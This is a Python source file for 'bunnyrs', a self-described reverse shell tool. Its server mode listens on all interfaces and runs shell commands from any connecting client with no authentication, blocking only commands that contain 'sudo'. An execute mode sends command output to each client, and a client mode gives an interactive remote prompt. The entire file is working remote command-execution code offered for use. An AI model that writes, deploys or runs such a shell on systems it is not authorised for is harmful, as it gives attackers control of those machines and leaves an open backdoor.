#!/usr/bin/python

import argparse
import socket
import subprocess
import sys
import threading
from typing import Tuple


class AnsiColorsPrint:
    """
    For printing with colors! defines static colored printing methods
    and public colors constants.
    """

    PINK = "\033[38;5;219m"  # pastel pink
    BLUE = "\033[96m"  # pastel cyan
    GREEN = "\033[38;5;151m"  # pastel green
    ORANGE = "\033[38;5;215m"  # pastel orange
    RED = "\033[91m"  # pastel red
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"

    @staticmethod
    def blue(message: str) -> None:
        print(AnsiColorsPrint.BLUE + message + AnsiColorsPrint.RESET)

    @staticmethod
    def pink(message: str) -> None:
        print(AnsiColorsPrint.PINK + message + AnsiColorsPrint.RESET)

    @staticmethod
    def green(message: str) -> None:
        print(AnsiColorsPrint.GREEN + message + AnsiColorsPrint.RESET)

    @staticmethod
    def orange(message: str) -> None:
        print(AnsiColorsPrint.ORANGE + message + AnsiColorsPrint.RESET)

    @staticmethod
    def red(message: str) -> None:
        print(AnsiColorsPrint.RED + message + AnsiColorsPrint.RESET)


def recv(sock: socket.socket, bufsize: int) -> bytes:
    """
    Receive all the data from a socket and return it.

    Parameters:
        sock: the socket to receive from
        bufsize: the buffer size
    """
    res = b""
    while True:
        data = sock.recv(bufsize)
        if not data:
            return b""
        res += data
        if len(data) < bufsize:
            break
    return res


def close(sock: socket.socket) -> None:
    """
    Cleanly close a socket.

    Parameters:
        sock: the socket to close
    """
    try:
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
    except OSError:
        pass


def execute_command(cmd: str) -> Tuple[str, str]:
    """
    Execute a shell command in a subprocess.

    Parameters:
        cmd: the command to be ran
    """
    cmd = cmd.strip()
    if not cmd:
        raise ValueError("cmd is empty")
    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    return (result.stdout, result.stderr)


class BunnyrsClient:
    """
    bunnyrs client mode. Connects to a bunnyrs server.

    Attributes:
        args: the arguments passed to argparse at launch
        socket: the client's socket
    """

    def __init__(self, args: argparse.Namespace) -> None:
        """
        Initialize the attributes and set the socket option to
        reuse sockets without waiting for TIME_WAIT to expire.
        """
        self.args = args
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self) -> None:
        """
        Run the bunnyrs client. Connect to target bunnyrs server.
        """
        try:
            self.socket.connect((self.args.target, self.args.port))
        except OSError as e:
            if e.errno == 111:
                AnsiColorsPrint.red(
                    f"Couldn't connect to {self.args.target}:{self.args.port}"
                )
            else:
                AnsiColorsPrint.red(f"Connection error: {e}")
            sys.exit(1)

        try:
            first = True
            while True:
                response = recv(self.socket, 4096)

                if not response:  # received empty response meaning connection ended
                    AnsiColorsPrint.red("Disconnected from target")
                    close(self.socket)
                    return

                if first:
                    AnsiColorsPrint.pink(
                        response.decode().replace(
                            "\n", f"\n{AnsiColorsPrint.RESET}", count=1
                        )
                    )
                    first = False
                else:
                    print(response.decode())
                buffer = input(AnsiColorsPrint.PINK + "> ")
                print(AnsiColorsPrint.RESET)
                self.socket.send(buffer.encode())

        except KeyboardInterrupt:
            AnsiColorsPrint.red("\nClient terminated.")
            close(self.socket)


class BunnyrsServer:
    """
    bunnyrs server mode. Handles bunnyrs clients.

    Attributes:
        args: the arguments passed to argparse at launch
        socket: the server's socket
        client_sockets: list of all the connected clients' sockets
        shutdown_event: a threading event to inform threads of shutdown
        running_from_user: the user that started the server
    """

    def __init__(self, args: argparse.Namespace) -> None:
        """
        Initialize the attributes and set the socket option to
        reuse sockets without waiting for TIME_WAIT to expire.
        """
        self.args = args
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.client_sockets: list[socket.socket] = []
        self.shutdown_event = threading.Event()
        self.running_from_user = self.whoami()

    def shutdown(self) -> None:
        """
        Shutdown the server by closing all clients' sockets, informing threads
        of shutdown and closing its own socket.
        """
        self.shutdown_event.set()
        for s in self.client_sockets:
            close(s)
        close(self.socket)
        AnsiColorsPrint.red("\nServer terminated")

    def whoami(self) -> str:
        """
        Get the username of the user that started the server.
        """
        stdout, _ = execute_command("whoami")
        return stdout.strip().replace("\n", "")

    def run(self) -> None:
        """
        Run the bunnyrs server. Accept connection from bunnyrs clients.
        """
        try:
            self.socket.bind(("0.0.0.0", self.args.port))
        except OSError as e:
            if e.errno == 98:
                AnsiColorsPrint.red(
                    f"{self.args.target}:{self.args.port} already in use"
                )
            else:
                AnsiColorsPrint.red(f"Bind error: {e}")
            sys.exit(1)

        try:
            self.socket.listen(5)
            while not self.shutdown_event.is_set():
                client_socket, client_address = self.socket.accept()
                self.client_sockets.append(client_socket)

                client_thread = threading.Thread(
                    target=self.handle_client, args=(client_socket, client_address)
                )
                client_thread.start()

        except KeyboardInterrupt:
            self.shutdown()

    def handle_client(
        self, client_socket: socket.socket, client_address: Tuple[str, int]
    ) -> None:
        """
        Handle bunnyrs client connection depending on the server's mode.
        """
        AnsiColorsPrint.green(f"{client_address[0]}:{client_address[1]} connected")
        if self.args.execute:
            self.handle_execute(client_socket, client_address)
        elif self.args.shell:
            self.handle_command_shell(client_socket, client_address)

    def handle_execute(
        self, client_socket: socket.socket, client_address: Tuple[str, int]
    ) -> None:
        """
        Handle the Execute server mode:
            On client connection: executes the specified command and sends the output.
        """
        header = "<# Execute #>"
        stdout, stderr = execute_command(self.args.execute)
        client_socket.send(f"{header}\n\n{stdout}\n{stderr}".encode())
        close(client_socket)
        AnsiColorsPrint.red(f"{client_address[0]}:{client_address[1]} disconnected")

    def handle_command_shell(
        self, client_socket: socket.socket, client_address: Tuple[str, int]
    ) -> None:
        """
        Handle the Reverse Shell server mode:
            Reverse shell available to connected clients.
        """
        client_socket.send(f"<# Reverse shell as {self.running_from_user} #> ".encode())

        while not self.shutdown_event.is_set():
            command = recv(client_socket, 64)

            if not command:  # received empty response meaning connection ended
                close(client_socket)
                AnsiColorsPrint.red(
                    f"{client_address[0]}:{client_address[1]} disconnected"
                )
                return

            command_str = command.decode()
            if "sudo" in command_str:
                response = "Sudo not supported"
            else:
                try:
                    stdout, stderr = execute_command(command_str)
                    AnsiColorsPrint.blue(
                        f"{client_address[0]}:{client_address[1]} executed {command_str}"
                    )
                    response = f"{stdout}\n{stderr}"
                except Exception as e:
                    response = str(e)

            client_socket.send(response.encode())


def check_execute_arg(value: str) -> str:
    if not value.strip():
        raise argparse.ArgumentTypeError("command is empty")
    return value


def check_port_arg(value: str) -> int:
    try:
        port = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError("port is not a number")
    if port < 0 or port > 65535:
        raise argparse.ArgumentTypeError("port should be between 0 and 65535")
    return port


def check_target_arg(value: str) -> str:
    error = argparse.ArgumentTypeError("target is not an IPv4 address")
    if value.count(".") != 3:
        raise error
    for x in value.split("."):
        try:
            x = int(x)
        except ValueError:
            raise error
        if x > 255 or x < 0:
            raise error
    return value


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="bunnyrs - reverse shell tool",
        epilog=f"{AnsiColorsPrint.PINK} Made with <3 by Arianne {AnsiColorsPrint.RESET}",
    )

    mode_group = parser.add_mutually_exclusive_group(required=False)

    parser.add_argument("-s", "--server", action="store_true", help="Server mode")
    mode_group.add_argument(
        "-sh",
        "--shell",
        action="store_true",
        help="Server profile: Reverse Shell - reverse shell available to connected clients.",
    )
    mode_group.add_argument(
        "-e",
        "--execute",
        type=check_execute_arg,
        help="Server profile: Execute - on client connection: executes the specified command and sends the output.",
    )

    parser.add_argument(
        "-t", "--target", type=check_target_arg, help="Target IPv4 address."
    )
    parser.add_argument(
        "-p", "--port", type=check_port_arg, help="Port number.", required=True
    )

    args = parser.parse_args()

    if args.server and args.target:
        AnsiColorsPrint.red("Can't set a target in Server mode")
        sys.exit(1)

    if args.server and (not args.shell and not args.execute):
        AnsiColorsPrint.red(
            "Server mode needs a profile: either --shell (-sh) or --execute (-e)"
        )
        sys.exit(1)

    if not args.server and (not args.target or not args.port):
        AnsiColorsPrint.red(
            "Client mode needs a target (--target (-t) and --port (-p))"
        )
        sys.exit(1)

    if not args.server and (args.shell or args.execute):
        AnsiColorsPrint.red("Can't set --shell (-sh) or --execute (-e) in Client mode")
        sys.exit(1)

    print("\n. ݁₊ ⊹ . ݁ bunnyrs (\\_/) ⟡ ݁ . ⊹ ₊ ݁.\n")

    if args.server:
        rs = BunnyrsServer(args)
    else:
        rs = BunnyrsClient(args)
    rs.run()
